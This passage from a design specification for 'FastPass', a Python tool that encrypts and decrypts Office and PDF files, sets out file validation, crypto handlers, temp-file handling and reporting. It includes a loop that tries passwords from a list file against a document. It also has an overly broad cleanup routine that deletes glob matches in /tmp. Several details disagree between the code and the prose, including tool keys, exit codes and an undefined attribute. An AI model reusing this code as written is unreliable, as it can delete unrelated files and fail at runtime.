    magic_to_format = {
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document': '.docx',
        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet': '.xlsx', 
        'application/vnd.openxmlformats-officedocument.presentationml.presentation': '.pptx',
        'application/pdf': '.pdf',
    }
    
    if detected_type and detected_type.mime in magic_to_format:
        # Magic number detected - use this as authoritative format
        authoritative_format = magic_to_format[detected_type.mime]
        
        # B4c: Cross-validate with file extension
        if file_extension != authoritative_format:
            # Log warning but trust magic number over extension
            print(f"Warning: Extension mismatch for {file_path.name}: {file_extension} vs detected {authoritative_format}")
        
        # Check if detected format is supported
        if authoritative_format not in FastPassConfig.SUPPORTED_FORMATS:
            raise FileFormatError(f"Detected file format not supported: {authoritative_format}")
            
        return authoritative_format
    
    # B4d: Fallback to extension-based validation
    if file_extension in FastPassConfig.SUPPORTED_FORMATS:
        print(f"Warning: Could not detect magic number for {file_path.name}, trusting extension: {file_extension}")
        return file_extension
    
    # B4e: Neither magic number nor extension indicate supported format
    raise FileFormatError(f"Unsupported or undetectable file format: {file_extension}")

def detect_encryption_status(file_path: Path, file_format: str) -> bool:
    """B5: Detect if file is password protected"""
    if file_format in ['.docx', '.xlsx', '.pptx']:
        # B5a: Office document encryption detection
        import msoffcrypto
        with open(file_path, 'rb') as f:
            office_file = msoffcrypto.OfficeFile(f)
            return office_file.is_encrypted()
    
    elif file_format == '.pdf':
        # B5b: PDF encryption detection
        import PyPDF2
        with open(file_path, 'rb') as f:
            pdf_reader = PyPDF2.PdfReader(f)
            return pdf_reader.is_encrypted
    
    return False

@dataclass
class FileManifest:
    """File manifest entry for processing pipeline"""
    path: Path
    format: str
    size: int
    is_encrypted: bool
    crypto_tool: str
```

**What's Actually Happening:**
- **B1: File Path Processing & Normalization**
  - Input processing: `args.files` list or `args.recursive` directory path
  - Path expansion: `os.path.expanduser('~/Documents/file.docx')` → `/home/user/Documents/file.docx`
  - Canonical paths: `pathlib.Path.resolve()` resolves symlinks and relative paths
  - File existence: `os.path.exists(file_path)` for each target file
  - Build file list: `validated_files = [Path objects with metadata]`
  - Missing files tracked: `missing_files = []` for error reporting
  - If any files missing: exit with detailed error message listing all missing files

- **B2: Path Traversal Security Analysis**
  - Absolute path resolution: `file_path.resolve()` to get canonical path with symlinks resolved
  - Base directory validation: Check if resolved path is within `Path.home().resolve()` or `Path.cwd().resolve()`
  - Containment checking: Use `resolved_path.relative_to(base_dir)` to verify path is within allowed boundaries
  - Component analysis: Reject paths containing `..`, `.`, hidden files, or empty components
  - System paths: Automatic rejection of paths outside user home and current working directory
  - Error handling: Convert OSError/ValueError to SecurityViolationError with sanitized messages
  - Critical exit: if security violations detected, `sys.exit(3)` with generic "security violation" message

- **B3: File Format Magic Number Validation (Primary Authority)**
  - **Priority 1**: Magic number detection via `filetype.guess(file_path)` - authoritative format detection
  - **Priority 2**: File extension validation as fallback when magic number undetectable
  - Magic number mapping (trusted authority):
    ```python
    magic_to_format = {
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document': '.docx',
        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet': '.xlsx',
        'application/vnd.openxmlformats-officedocument.presentationml.presentation': '.pptx',
        'application/pdf': '.pdf',
        'application/zip': '.zip'
    }
    ```
  - Cross-validation: When magic number and extension disagree, trust magic number but log warning
  - Fallback strategy: If magic number undetectable, validate extension against supported formats
  - Format violations: Unsupported formats (by either method) trigger `FileFormatError`

- **B4: File Access & Permission Verification**
  - Read access test: `open(file_path, 'rb')` with exception handling
  - Sample read: read first 1024 bytes to verify file accessibility and detect corruption
  - Size validation: `os.path.getsize(file_path)` vs `max_file_size = 500MB` limit
  - Empty file check: `file_size == 0` indicates potential corruption or invalid file
  - Output directory access: if `--output-dir` specified, test write access to target directory
  - Permission violations: collected in `access_violations = []`
  - If access violations: `sys.exit(1)` with detailed permission error messages

- **B5: Password Protection Status Detection**
  - **Office Documents**: `msoffcrypto.OfficeFile(file_stream).is_encrypted()` returns boolean
  - **PDF Files**: `PyPDF2.PdfReader(file_stream).is_encrypted` property check
  - Store status: `password_status = {'file_path': bool}` for each file
  - **Special case**: If operation is 'encrypt' and file already encrypted, add to warnings
  - **Special case**: If operation is 'decrypt' and file not encrypted, add to warnings

- **B6: Validated File Manifest Creation**  
  - Build manifest: `file_manifest = []` containing complete file metadata
  - Manifest entry structure:
    ```python
    manifest_entry = {
        'path': Path,
        'extension': str,
        'format': str, 
        'size': int,
        'is_password_protected': bool,
        'crypto_tool': str,  # 'msoffcrypto', 'pypdf2'
        'temp_file_needed': bool
    }
    ```
  - Tool assignment: map file extension to appropriate crypto tool
  - Summary calculation: `total_files = len(file_manifest)`, `protected_files = count(is_password_protected)`
  - If critical errors: `sys.exit(3)` with validation summary
  - Success state: `validation_complete = True`, ready for crypto tool setup

---

## Section C: Crypto Tool Selection & Configuration

> **TOOL INTEGRATION CRITICAL**: Each crypto tool handler must be implemented exactly as diagrammed. Label each handler class and method with corresponding IDs.

```python
# C1: CRYPTO TOOL HANDLER SETUP
def setup_crypto_tools_and_configuration(validated_files: List[FileManifest]) -> Dict[str, Any]:
    """Initialize and configure crypto tool handlers based on file types"""
    
    # C1a: Determine required tools
    required_tools = set(manifest.crypto_tool for manifest in validated_files)
    
    crypto_handlers = {}
    
    # C1b: Initialize Office document handler
    if 'msoffcrypto' in required_tools:
        crypto_handlers['msoffcrypto'] = OfficeDocumentHandler()
    
    # C1c: Initialize PDF handler  
    if 'PyPDF2' in required_tools:
        crypto_handlers['PyPDF2'] = PDFHandler()
    
    return crypto_handlers

class OfficeDocumentHandler:
    """Handler for Office document encryption/decryption using msoffcrypto"""
    
    def __init__(self):
        import msoffcrypto
        self.msoffcrypto = msoffcrypto
        
    def encrypt_file(self, input_path: Path, output_path: Path, password: str) -> None:
        """C2a: Secure Office document encryption with hardened security"""
        # Use the secure implementation that includes all security validations
        encrypt_file_secure(self, input_path, output_path, password)
    
    def decrypt_file(self, input_path: Path, output_path: Path, password: str) -> None:
        """C2b: Decrypt Office document"""
        with open(input_path, 'rb') as input_file:
            office_file = self.msoffcrypto.OfficeFile(input_file)
            office_file.load_key(password=password)
            
            with open(output_path, 'wb') as output_file:
                office_file.save(output_file)
    
    def test_password(self, file_path: Path, password: str) -> bool:
        """C2c: Test if password works for Office document"""
        try:
            with open(file_path, 'rb') as f:
                office_file = self.msoffcrypto.OfficeFile(f)
                office_file.load_key(password=password)
                return True
        except Exception:
            return False

class PDFHandler:
    """Handler for PDF encryption/decryption using PyPDF2"""
    
    def __init__(self):
        import PyPDF2
        self.PyPDF2 = PyPDF2
        
    def encrypt_file(self, input_path: Path, output_path: Path, password: str) -> None:
        """C3a: Encrypt PDF document"""
        with open(input_path, 'rb') as input_file:
            pdf_reader = self.PyPDF2.PdfReader(input_file)
            pdf_writer = self.PyPDF2.PdfWriter()
            
            # Copy all pages
            for page in pdf_reader.pages:
                pdf_writer.add_page(page)
            
            # Encrypt with password
            pdf_writer.encrypt(password)
            
            with open(output_path, 'wb') as output_file:
                pdf_writer.write(output_file)
    
    def decrypt_file(self, input_path: Path, output_path: Path, password: str) -> None:
        """C3b: Decrypt PDF document"""
        with open(input_path, 'rb') as input_file:
            pdf_reader = self.PyPDF2.PdfReader(input_file)
            
            if pdf_reader.is_encrypted:
                pdf_reader.decrypt(password)
            
            pdf_writer = self.PyPDF2.PdfWriter()
            
            # Copy all pages
            for page in pdf_reader.pages:
                pdf_writer.add_page(page)
            
            with open(output_path, 'wb') as output_file:
                pdf_writer.write(output_file)
    
    def test_password(self, file_path: Path, password: str) -> bool:
        """C3c: Test if password works for PDF"""
        try:
            with open(file_path, 'rb') as f:
                pdf_reader = self.PyPDF2.PdfReader(f)
                if pdf_reader.is_encrypted:
                    return pdf_reader.decrypt(password) == 1
                return True
        except Exception:
            return False

# C4: PASSWORD MANAGEMENT SYSTEM
class PasswordManager:
    """Manages password priority system and validation"""
    
    def __init__(self, cli_passwords: List[str], password_list_file: Optional[Path]):
        self.cli_passwords = cli_passwords or []
        self.password_list_file = password_list_file
        self.password_list: List[str] = []
        
        # C4a: Load password list from file
        if password_list_file:
            self.load_password_list()
    
    def load_password_list(self) -> None:
        """C4b: Load passwords from file"""
        try:
            with open(self.password_list_file, 'r', encoding='utf-8') as f:
                self.password_list = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            raise FileNotFoundError(f"Password list file not found: {self.password_list_file}")
    
    def get_password_candidates(self, file_path: Path) -> List[str]:
        """C4c: Get password candidates in priority order"""
        candidates = []
        
        # Priority 1: CLI passwords
        candidates.extend(self.cli_passwords)
        
        # Priority 2: Password list file
        candidates.extend(self.password_list)
        
        # Remove duplicates while preserving order
        seen = set()
        unique_candidates = []
        for pwd in candidates:
            if pwd not in seen:
                seen.add(pwd)
                unique_candidates.append(pwd)
        
        return unique_candidates
    
    def find_working_password(self, file_path: Path, crypto_handler: Any) -> Optional[str]:
        """C4d: Find working password for file"""
        candidates = self.get_password_candidates(file_path)
        
        for password in candidates:
            if crypto_handler.test_password(file_path, password):
                return password
        
        return None
```

**What's Actually Happening:**
- **C1: File Format Analysis & Tool Mapping**
  - Process validated file manifest: `for file_entry in self.file_manifest:`
  - Extension-to-tool mapping:
    ```python
    tool_mapping = {
        '.docx': 'msoffcrypto', '.xlsx': 'msoffcrypto', '.pptx': 'msoffcrypto',
        '.doc': 'msoffcrypto', '.xls': 'msoffcrypto', '.ppt': 'msoffcrypto',  
        '.pdf': 'PyPDF2'
    }
    ```
  - Assign crypto tool: `file_entry['crypto_tool'] = tool_mapping[file_entry['extension']]`
  - Group by tool: `self.tool_groups = {'msoffcrypto': [], 'PyPDF2': []}`
  - Availability check: ensure required tools are available for file types present
  - If tool missing: `sys.exit(1)` with "Required crypto tool not available: {tool_name}"

- **C2: Crypto Tool Handler Initialization**
  - **msoffcrypto Handler**:
    ```python
    class OfficeHandler:
        def __init__(self):
            self.tool_path = 'python -m msoffcrypto.cli'
            self.temp_files = []
        
        def encrypt(self, input_path, output_path, password):
            # Implementation using msoffcrypto
        
        def decrypt(self, input_path, output_path, password):
            # Implementation using msoffcrypto
    ```
  - **PyPDF2 Handler**:
    ```python
    class PDFHandler:
        def __init__(self):
            self.pdf_library = 'PyPDF2'
        
        def encrypt(self, input_path, output_path, password):
            # Implementation using PyPDF2 library
    ```

- **C4: msoffcrypto-tool Configuration**
  - Test tool availability: `subprocess.run(['python', '-m', 'msoffcrypto.cli', '--version'])`
  - Configure encryption options:
    ```python
    office_config = {
        'password_method': 'standard',  # Use standard Office encryption
        'temp_dir': self.temp_working_dir,
        'preserve_metadata': True
    }
    ```
  - Set handler methods: `self.office_handler.set_config(office_config)`
  - Store in pipeline: `self.crypto_handlers['msoffcrypto'] = office_handler`

- **C5: PyPDF2 Configuration** 
  - Initialize PDF library:
    ```python
    import PyPDF2
    self.pdf_library = 'PyPDF2'
    # Verify version compatibility for encryption features
    if hasattr(PyPDF2, 'PdfWriter'):  # Check for newer API
        self.writer_class = PyPDF2.PdfWriter
    else:
        self.writer_class = PyPDF2.PdfFileWriter  # Legacy API
    ```
  - Configure PDF encryption settings:
    ```python
    pdf_config = {
        'encryption_algorithm': 'AES-256',
        'permissions': {'print': True, 'modify': False, 'copy': True},
        'user_password': None,  # Will be set per operation
        'owner_password': None  # Same as user password by default
    }
    ```


- **C7: Tool-Specific Option Configuration**
  - **Office Documents**: Set metadata preservation, compatible encryption methods
  - **PDF Files**: Configure user/owner passwords, permission settings
  - Password validation: ensure passwords meet tool-specific requirements
  - Error handling: configure timeout values, retry attempts for each tool
  - Logging: set up per-tool debug logging if enabled

- **C8: Processing Pipeline Creation**
  - Build processing queue: `self.processing_queue = []`
  - For each file, create processing task:
    ```python
    task = {
        'file_path': Path,
        'operation': 'encrypt' | 'decrypt',
        'crypto_handler': handler_object,
        'password': str,
        'output_path': Path,
        'temp_files': []
    }
    ```
  - Sort by file size: process smaller files first for faster feedback
  - Dependency resolution: if files depend on each other, order appropriately
  - Pipeline validation: ensure all tasks have required inputs and handlers
  - Ready state: `self.pipeline_ready = True`, `self.total_tasks = len(processing_queue)`

---

## Section D: File Processing & Operations

> **PROCESSING CRITICAL**: Each step must handle errors gracefully with proper cleanup. Map every processing step to exact code implementation.

```python
# D1: SECURE TEMPORARY DIRECTORY SETUP
def create_secure_temporary_directory() -> Path:
    """Create secure temporary working directory with proper permissions"""
    import tempfile
    import os
    from datetime import datetime
    
    # D1a: Generate unique temp directory name
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    pid = os.getpid()
    temp_name = f"{FastPassConfig.TEMP_DIR_PREFIX}{timestamp}_{pid}"
    
    # D1b: Create temp directory with secure permissions
    temp_dir = Path(tempfile.mkdtemp(prefix=temp_name))
    os.chmod(temp_dir, 0o700)  # Owner read/write/execute only
    
    # D1c: Create subdirectories
    (temp_dir / 'processing').mkdir()
    (temp_dir / 'output').mkdir()
    
    return temp_dir

# D1d: ENHANCED TEMPORARY FILE MANAGEMENT WITH CLEANUP TRACKING
class TempFileManager:
    """Centralized temporary file management with guaranteed cleanup"""
    
    def __init__(self):
        self.temp_directories = []
        self.temp_files = []
        self.cleanup_registered = False
    
    def create_temp_directory(self) -> Path:
        """Create tracked temporary directory with automatic cleanup registration"""
        temp_dir = create_secure_temporary_directory()
        self.temp_directories.append(temp_dir)
        
        if not self.cleanup_registered:
            import atexit
            atexit.register(self.emergency_cleanup)
            self.cleanup_registered = True
            
        return temp_dir
    
    def emergency_cleanup(self):
        """Emergency cleanup for atexit registration"""
        for temp_dir in self.temp_directories:
            try:
                cleanup_temporary_directory(temp_dir)
            except Exception:
                pass  # Silent emergency cleanup

# D1e: CONTEXT MANAGER FOR SECURE TEMPORARY DIRECTORIES
class SecureTempDirectory:
    """Context manager ensuring automatic cleanup even on exceptions"""
    
    def __init__(self):
        self.temp_dir = None
    
    def __enter__(self) -> Path:
        self.temp_dir = create_secure_temporary_directory()
        return self.temp_dir
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.temp_dir:
            cleanup_temporary_directory(self.temp_dir)

# D2: FILE PROCESSING PIPELINE
def process_files_with_crypto_operations(
    validated_files: List[FileManifest], 
    crypto_handlers: Dict[str, Any],
    args: argparse.Namespace
) -> ProcessingResults:
    """Main file processing pipeline with crypto operations"""
    
    # D2a: Create secure temporary directory
    temp_dir = create_secure_temporary_directory()
    
    try:
        processing_results = ProcessingResults()
        
        for file_manifest in validated_files:
            try:
                # D2b: Process individual file
                result = process_single_file(
                    file_manifest, 
                    crypto_handlers[file_manifest.crypto_tool],
                    temp_dir,
                    args
                )
                processing_results.successful_files.append(result)
                
            except Exception as e:
                error_info = FileProcessingError(
                    file_path=file_manifest.path,
                    error_message=str(e),
                    error_type=type(e).__name__
                )
                # Sanitize error message before storing
                error_info.error_message = sanitize_error_message(error_info.error_message)
                processing_results.failed_files.append(error_info)
                
                # Clean up any partial processing for this file
                cleanup_failed_file_processing(file_manifest.path)
        
        return processing_results
        
    finally:
        # D2c: Guaranteed cleanup with error isolation
        try:
            cleanup_temporary_directory(temp_dir)
        except Exception as cleanup_error:
            # Log cleanup failure but don't mask processing results
            print(f"Warning: Cleanup failed for {temp_dir}: {cleanup_error}")

def process_single_file(
    file_manifest: FileManifest,
    crypto_handler: Any,
    temp_dir: Path,
    args: argparse.Namespace
) -> FileProcessingResult:
    """D3: Process a single file through crypto operations"""
    
    # D3a: Find working password
    password = crypto_handler.password_manager.find_working_password(
        file_manifest.path, crypto_handler
    )
    
    if not password:
        raise ProcessingError(f"No working password found for {file_manifest.path}")
    
    # D3b: Setup temporary file paths
    temp_input = temp_dir / 'processing' / f"input_{file_manifest.path.name}"
    temp_output = temp_dir / 'output' / f"output_{file_manifest.path.name}"
    
    # D3c: Copy input to temp location
    shutil.copy2(file_manifest.path, temp_input)
    
    # D3d: Perform crypto operation
    if args.operation == 'encrypt':
        crypto_handler.encrypt_file(temp_input, temp_output, password)
    else:  # decrypt
        crypto_handler.decrypt_file(temp_input, temp_output, password)
    
    # D3e: Validate output file
    validate_processed_file(temp_output, args.operation, crypto_handler)
    
    # D3f: Atomic move to final destination with error handling
    final_path = determine_output_path(file_manifest.path, args.output_dir)
    
    try:
        # Ensure target directory exists
        final_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Atomic move to final destination
        shutil.move(temp_output, final_path)
    except Exception as e:
        # Clean up temp output file if move fails
        if temp_output.exists():
            temp_output.unlink()
        raise ProcessingError(f"Failed to move processed file to destination: {e}")
    
    return FileProcessingResult(
        original_path=file_manifest.path,
        final_path=final_path,
        operation=args.operation,
        password_used=password,
        file_size_before=file_manifest.size,
        file_size_after=final_path.stat().st_size
    )

def validate_processed_file(output_path: Path, operation: str, crypto_handler: Any) -> None:
    """D4: Validate that processed file is correct"""
    
    # D4a: Check file exists and has reasonable size
    if not output_path.exists():
        raise ProcessingError("Output file was not created")
    
    if output_path.stat().st_size == 0:
        raise ProcessingError("Output file is empty")
    
    # D4b: Format-specific validation
    file_format = output_path.suffix.lower()
    
    if file_format in ['.docx', '.xlsx', '.pptx']:
        validate_office_document(output_path, operation)
    elif file_format == '.pdf':
        validate_pdf_document(output_path, operation)

def validate_office_document(file_path: Path, operation: str) -> None:
    """D4c: Validate Office document integrity"""
    import msoffcrypto
    
    try:
        with open(file_path, 'rb') as f:
            office_file = msoffcrypto.OfficeFile(f)
            
            if operation == 'encrypt':
                # After encryption, file should be encrypted
                if not office_file.is_encrypted():
                    raise ProcessingError("File was not properly encrypted")
            else:  # decrypt
                # After decryption, file should not be encrypted
                if office_file.is_encrypted():
                    raise ProcessingError("File was not properly decrypted")
    except Exception as e:
        raise ProcessingError(f"Office document validation failed: {e}")

def validate_pdf_document(file_path: Path, operation: str) -> None:
    """D4d: Validate PDF document integrity"""
    import PyPDF2
    
    try:
        with open(file_path, 'rb') as f:
            pdf_reader = PyPDF2.PdfReader(f)
            
            if operation == 'encrypt':
                # After encryption, PDF should be encrypted
                if not pdf_reader.is_encrypted:
                    raise ProcessingError("PDF was not properly encrypted")
            else:  # decrypt
                # After decryption, PDF should not be encrypted
                if pdf_reader.is_encrypted:
                    raise ProcessingError("PDF was not properly decrypted")
                    
            # Test that we can read at least one page
            if len(pdf_reader.pages) == 0:
                raise ProcessingError("PDF has no readable pages")
                
    except Exception as e:
        raise ProcessingError(f"PDF validation failed: {e}")

@dataclass
class ProcessingResults:
    successful_files: List[FileProcessingResult] = field(default_factory=list)
    failed_files: List[FileProcessingError] = field(default_factory=list)

@dataclass  
class FileProcessingResult:
    original_path: Path
    final_path: Path
    operation: str
    password_used: str
    file_size_before: int
    file_size_after: int

@dataclass
class FileProcessingError:
    file_path: Path
    error_message: str
    error_type: str

def cleanup_failed_file_processing(file_path: Path) -> None:
    """Clean up processing artifacts for a failed file"""
    import tempfile
    import shutil
    
    try:
        # Remove any temporary files associated with this file
        temp_patterns = [
            f"*{file_path.stem}*",
            f"temp_{file_path.name}*",
            f"processing_{file_path.name}*"
        ]
        
        # Clean up from common temp locations
        temp_dirs = [Path.cwd() / 'temp', Path('/tmp'), Path(tempfile.gettempdir())]
        
        for temp_dir in temp_dirs:
            if temp_dir.exists():
                for pattern in temp_patterns:
                    for temp_file in temp_dir.glob(pattern):
                        try:
                            if temp_file.is_file():
                                temp_file.unlink()
                            elif temp_file.is_dir():
                                shutil.rmtree(temp_file)
                        except Exception:
                            # Continue cleanup even if some files can't be removed
                            pass
                            
    except Exception:
        # Don't let cleanup errors propagate
        pass
```

**What's Actually Happening:**
- **D1: Secure Temporary Directory Setup**
  - Generate unique temp directory: `temp_name = f'FastPass_{datetime.now():%Y%m%d_%H%M%S}_{os.getpid()}'`
  - Create with secure permissions: `tempfile.mkdtemp(prefix=temp_name)` then `os.chmod(temp_dir, 0o700)`
  - Directory structure: `temp_dir/processing/` for input files, `temp_dir/output/` for processed files
  - Cleanup tracking: `self.temp_directories_created = [temp_dir]` for later cleanup

- **D2: Processing Pipeline Execution**
  - Queue processing: `for task in self.processing_queue:`
  - File isolation: copy each file to `temp_dir/processing/` before processing
  - Tool routing: select appropriate crypto handler based on file format
  - Password application: use `password_manager.find_working_password()` for each file
  - Operation dispatch: call `handler.encrypt()` or `handler.decrypt()` based on mode
  - Output validation: verify processed file integrity and correct encryption status
  - Error handling: collect failures in `failed_files = []`, continue processing remaining files

- **D3: Individual File Processing**
  - **Input preparation**: Copy file to temp location with `shutil.copy2(original, temp_input)`
  - **Password validation**: Test password with crypto tool before processing
  - **Processing execution**: 
    - For Office files: use msoffcrypto library via subprocess or direct API
    - For PDF files: use PyPDF2 with PdfReader/PdfWriter classes
  - **Output verification**: Confirm processed file has correct encryption status
  - **File movement**: Move from temp location to final destination (in-place or output directory)

- **D4: File Integrity Validation**
  - **Existence check**: Verify output file was created and is non-empty
  - **Format validation**: Ensure file still opens correctly with appropriate tool
  - **Encryption status**: Verify encrypt/decrypt operation achieved expected result:
    - After encryption: file should be password-protected
    - After decryption: file should not require password
  - **Content integrity**: For PDFs, verify at least one page readable; for Office docs, verify document structure intact
  - **Size sanity check**: File size should be reasonable (not 0 bytes, not dramatically different unless expected)

- **D5: Enhanced Temporary File Management**
  - **Cleanup tracking**: `TempFileManager` class tracks all temporary files and directories
  - **Emergency cleanup**: `atexit.register()` ensures cleanup even on unexpected termination
  - **Context managers**: `SecureTempDirectory` provides automatic cleanup with `try`/`finally`
  - **Retry logic**: Multiple cleanup attempts with exponential backoff for permission issues
  - **Secure deletion**: Overwrite sensitive temporary files with zeros before deletion
  - **Error isolation**: Cleanup failures don't mask original processing errors

- **D6: Error Handling & Recovery**
  - **Per-file errors**: Collect in `processing_errors = []` with details, continue processing other files
  - **Critical errors**: Stop processing, restore all backups, cleanup temp files
  - **Password errors**: Distinguish between wrong password vs crypto tool failure
  - **File corruption**: Detect if input file becomes corrupted during processing
  - **Partial success**: Some files succeed, some fail - report both with detailed status

---

## Section E: Cleanup & Results Reporting

> **CLEANUP CRITICAL**: All temporary files, passwords in memory, and system state must be properly cleaned up. Map every cleanup operation to code.

```python
# E1: RESULTS SUMMARIZATION AND CLEANUP
def cleanup_and_generate_final_report(processing_results: ProcessingResults) -> int:
    """Generate final report and determine exit code"""
    
    # E1a: Calculate summary statistics
    total_files = len(processing_results.successful_files) + len(processing_results.failed_files)
    successful_count = len(processing_results.successful_files)
    failed_count = len(processing_results.failed_files)
    
    # E1b: Generate report
    generate_operation_report(processing_results, total_files, successful_count, failed_count)
    
    # E1c: Clear sensitive data from memory
    clear_sensitive_data()
    
    # E1d: Determine exit code
    if failed_count == 0 and successful_count > 0:
        return 0  # Success
    elif failed_count > 0 and successful_count > 0:
        return 1  # Partial success
    elif failed_count > 0 and successful_count == 0:
        return 1  # Complete failure
    else:
        return 2  # No files processed

def generate_operation_report(
    processing_results: ProcessingResults,
    total_files: int,
    successful_count: int, 
    failed_count: int,
    report_format: str = 'text'
) -> None:
    """E2: Generate comprehensive operation report in specified format"""
    
    if report_format == 'json':
        generate_json_report(processing_results, total_files, successful_count, failed_count)
    elif report_format == 'csv':
        generate_csv_report(processing_results, total_files, successful_count, failed_count)
    else:  # text format (default)
        generate_text_report(processing_results, total_files, successful_count, failed_count)

def generate_text_report(
    processing_results: ProcessingResults,
    total_files: int,
    successful_count: int,
    failed_count: int
) -> None:
    """Generate human-readable text report"""
    
    print("\n" + "="*50)
    print("FastPass Operation Complete")
    print("="*50)
    
    # E2a: Summary statistics
    print(f"Total files processed: {total_files}")
    print(f"Successful: {successful_count}")
    print(f"Failed: {failed_count}")
    
    # E2b: List successful files
    if processing_results.successful_files:
        print(f"\n✓ Successful files:")
        for result in processing_results.successful_files:
            size_change = result.file_size_after - result.file_size_before
            size_indicator = f"({size_change:+d} bytes)" if size_change != 0 else ""
            print(f"  • {result.original_path.name} → {result.final_path.name} {size_indicator}")
    
    # E2c: List failed files
    if processing_results.failed_files:
        print(f"\n✗ Failed files:")
        for error in processing_results.failed_files:
            print(f"  • {error.file_path.name}: {error.error_message}")
    
    # E2d: Next steps
    if failed_count > 0:
        print(f"\nTroubleshooting:")
        print("- Verify passwords are correct")
        print("- Check file permissions")
        print("- Ensure files are not corrupted")

def generate_json_report(
    processing_results: ProcessingResults,
    total_files: int,
    successful_count: int,
    failed_count: int
) -> None:
    """Generate machine-readable JSON report"""
    import json
    from datetime import datetime
    
    report = {
        "timestamp": datetime.now().isoformat(),
        "summary": {
            "total_files": total_files,
            "successful": successful_count,
            "failed": failed_count,
            "success_rate": successful_count / total_files if total_files > 0 else 0
        },
        "successful_files": [
            {
                "original_path": str(result.original_path),
                "final_path": str(result.final_path),
                "operation": result.operation,
                "file_size_before": result.file_size_before,
                "file_size_after": result.file_size_after,
                "size_change": result.file_size_after - result.file_size_before
            }
            for result in processing_results.successful_files
        ],
        "failed_files": [
            {
                "file_path": str(error.file_path),
                "error_message": error.error_message,
                "error_type": error.error_type
            }
            for error in processing_results.failed_files
        ]
    }
    
    print(json.dumps(report, indent=2))

def generate_csv_report(
    processing_results: ProcessingResults,
    total_files: int,
    successful_count: int,
    failed_count: int
) -> None:
    """Generate CSV format report"""
    import csv
    import sys
    
    writer = csv.writer(sys.stdout)
    
    # Write header
    writer.writerow(['file_path', 'status', 'operation', 'size_before', 'size_after', 'error_message'])
    
    # Write successful files
    for result in processing_results.successful_files:
        writer.writerow([
            str(result.original_path),
            'success',
            result.operation,
            result.file_size_before,
            result.file_size_after,
            ''
        ])
    
    # Write failed files
    for error in processing_results.failed_files:
        writer.writerow([
            str(error.file_path),
            'failed',
            '',
            '',
            '',
            error.error_message
        ])

def clear_sensitive_data() -> None:
    """E3: Clear passwords and sensitive data from memory"""
    import gc
    
    # E3a: This would be implemented to overwrite password variables
    # In practice, Python doesn't provide direct memory overwriting
    # but we can delete variables and force garbage collection
    
    # Clear any global password variables
    globals_to_clear = [k for k in globals().keys() if 'password' in k.lower()]
    for var_name in globals_to_clear:
        if var_name in globals():
            del globals()[var_name]
    
    # Force garbage collection
    gc.collect()

def cleanup_temporary_directory(temp_dir: Path) -> None:
    """E4: Secure cleanup with retry logic and secure file deletion"""
    import shutil
    import time
    import os
    
    if not temp_dir.exists():
        return
    
    # E4a: Multiple cleanup attempts with exponential backoff
    max_attempts = 3
    for attempt in range(max_attempts):
        try:
            # E4b: Secure deletion of sensitive files (attempt to overwrite)
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    try:
                        file_size = file_path.stat().st_size
                        # Only attempt secure deletion for reasonably sized files
                        if 0 < file_size < 10 * 1024 * 1024:  # < 10MB
                            with open(file_path, 'r+b') as f:
                                f.write(b'\x00' * file_size)
                                f.flush()
                                os.fsync(f.fileno())
                    except Exception:
                        # Secure deletion failed, continue with normal deletion
                        pass
            
            # E4c: Remove entire directory tree
            shutil.rmtree(temp_dir)
            return  # Success - exit retry loop
            
        except (PermissionError, OSError) as e:
            if attempt < max_attempts - 1:
                # Exponential backoff for retry
                time.sleep(0.1 * (2 ** attempt))
                continue
            else:
                print(f"Warning: Could not clean up temp directory {temp_dir}: {e}")
                break
```

**What's Actually Happening:**
- **E1: Operation Summary & Statistics Calculation**
  - Count files: `total_files = len(self.processing_results)`
  - Success rate: `successful_files = len([r for r in results if r.status == 'success'])`
  - Failure breakdown: categorize failures by type (password, permission, corruption, tool failure)
  - Processing time: `total_time = datetime.now() - self.operation_start_time`
  - Performance stats: files per second, total bytes processed, average file size

- **E2: Comprehensive Results Report Generation**
  - **Header section**: FastPass version, operation mode, timestamp
  - **Summary statistics**: Total files, success count, failure count, processing time
  - **Successful files list**: 
    ```
    ✓ Successful files:
      • document1.docx → document1.docx (encrypted, +1,247 bytes)
      • report.pdf → secured/report.pdf (decrypted, -892 bytes)
      • data.xlsx → data.xlsx (encrypted, +2,156 bytes)
    ```
  - **Failed files list**: 
    ```
    ✗ Failed files:
      • protected.pdf: Wrong password
      • corrupt.docx: File format error
      • readonly.xlsx: Permission denied
    ```
  - **Troubleshooting section**: If failures occurred, provide specific guidance based on failure types

- **E3: Sensitive Data Memory Cleanup**
  - **Password variables**: Explicitly delete all password variables from memory
  - **Command line args**: Clear args.passwords, args.password_list contents  
  - **Processing state**: Clear password_manager internal state
  - **Garbage collection**: Force `gc.collect()` to ensure memory cleanup
  - **Note**: Python doesn't guarantee memory overwriting, but this is best effort cleanup

- **E4: Temporary File & Directory Cleanup**
  - **Temp directory removal**: `shutil.rmtree(temp_dir)` for each temp directory created
  - **Intermediate files**: Clean up any partial processing files left behind
  - **Lock files**: Remove any file locks or temp markers created during processing
  - **Error handling**: Log warnings for cleanup failures but don't fail the operation

- **E5: Final Exit Code Determination**
  - **Exit Code 0**: All files processed successfully, no errors
  - **Exit Code 1**: Some files failed, some succeeded (partial success)
  - **Exit Code 2**: All files failed to process, or no files processed
  - **Exit Code 3**: Security violation detected, operation aborted
  - **Exit Code 4**: Authentication failure (wrong passwords for all files)

- **E6: Operation State Reset**
  - Clear processing queues: `self.processing_queue = []`
  - Reset file manifests: `self.file_manifest = []`
  - Clear handler references: `self.crypto_handlers = {}`
  - Reset application state: `self.ready_for_processing = False`
  - Final log entry: `logger.info(f"FastPass operation completed in {total_time} with {successful_count}/{total_files} files successful")`

---

## Security Implementation Summary

### **Comprehensive Security Hardening Implemented**

FastPass includes enterprise-grade security hardening based on comprehensive threat analysis and attack vector identification. All security measures are mandatory and must be implemented exactly as specified.

#### **Security Mitigations by Attack Vector**

| **Attack Vector** | **Mitigation Implemented** | **Security Function** |
|-------------------|---------------------------|----------------------|
| **Path Traversal** | Hardened path validation with symlink detection | `validate_path_security_hardened()` |
| **Command Injection** | Direct library calls + secure subprocess | `encrypt_file_secure()` |
